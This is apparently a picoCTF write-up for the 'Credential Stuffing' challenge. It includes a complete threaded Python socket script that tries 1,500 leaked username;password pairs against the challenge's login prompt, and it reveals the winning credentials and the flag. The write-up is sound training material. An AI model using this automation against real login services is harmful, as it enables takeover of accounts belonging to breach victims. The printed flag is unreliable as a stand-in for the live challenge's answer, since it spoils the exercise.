---
title: PicoCTF Credential Stuffing Writeup
description: A writeup of the PicoCTF Credential Stuffing challenge using raw TCP and threaded automation.
author: Koussay Dhifi
categories: [Writeups, PicoCTF]
tags: [WebExploitation, PicoCTF, CredentialStuffing, Sockets]
pin: false
math: false
mermaid: true
---

## Introduction

This is another medium picoCTF challenge titled [Credential Stuffing](https://learn.cylabacademy.org/library/749?page=1&difficulty=2&category=1).

It has the following description :
**Credential stuffing is the automated injection of stolen username and password pairs (“credentials”) in to website login forms, in order to fraudulently gain access to user accounts.
Since many users will re-use the same password and username/email, when those credentials are exposed (by a database breach or phishing attack, for example) submitting those sets of stolen credentials into dozens or hundreds of other sites can allow an attacker to compromise those accounts too. Download the credentials dump here.**

So from what I understand we are going to do some scirpting to automate this insertion.

And the rest is :

**There was a recent data breach at a famous department store, in which the login credentials of thousands of users were stolen and dumped online. You're hoping at least one person reused their credentials from the department store for an account at a local bank. Stuff those credentials and get the flag!**

## Recon

First we are provided by a txt file that contains credentials separeted by semicolumn (;).

and we won't be opening a browser to open the website basically it is a net cat connection like the following:

```sh
$ nc crystal-peak.picoctf.net 58567

=========================================
Welcome to the Online Banking Service!
=========================================

Please enter your username & password to login.
Username: dfs
dfs
fPassword: dfs
fdfs

Invalid username or password
```

So basically we will be writing a script to automate credential stuffing for all of these creds that's it.

## Payload and Exploitation

Since we have a lot of credentials 1500 lines I decided to use threading, where I have 10 threads each one takes care of 150 line and by receiving text we test it if it contains the word "Invalid" we pass if not we store the new string -supposdly the flag- in a text file and each thread is going to have its own text file named after its index so we won't turn this writeup into a semaphoe studying.

```py
import socket
import threading
import time

def recv_until(s, marker):
    """Keep calling recv() until marker is found."""
    data = b""
    while marker not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data.decode()

with open ("creds-dump.txt", "rt") as f:
	creds = f.read()
	creds = creds.split('\n')

def bruteForce(start, finish, thread):

	s = socket.socket()

	s.connect(("crystal-peak.picoctf.net", 52193))

	for i in range(start, finish):
		credss = creds[i].split(";")
		print(f"Trying {credss}")
		recv_until(s, b"Username")
		s.send((credss[0]+'\n').encode())
		recv_until(s, b"Password")
		s.send((credss[1]+'\n').encode())
		msg = recv_until(s, b"Invalid")
		print(msg)
		if "Invalid" in msg:
			s.close()
			s = socket.socket()
			s.connect(("crystal-peak.picoctf.net", 52193))

			#Here we reconnect since connection closes after each invalid attempt

		else:

			with open(f"result_{thread}.txt","at") as f2:
				f2.write(msg+'\n')

	
	s.close()
		

start = 0
threads = []
for i in range (10):

	t = threading.Thread(target=bruteForce, args=(start, start+150, i))

	threads.append(t)
	threads[i].start()
	time.sleep(0.1)

	start += 150
```

We wait for a text file to be created ... Some blank ones where created due to raw tcp connection not being so stable since sometimes we receive blank text.

After waiting around 1 mn or 2 another text file is created with the correct creds `allen:talon` and the flag along side them.

```txt
Authenticating...
Welcome allen!
picoCTF{d0nt_r3u5e_cr3d3nt1als_Find_Your_own}
```

## Conclusion

This was a challenge not about web exploitation directly but it is a great practice for socket programming and threading.
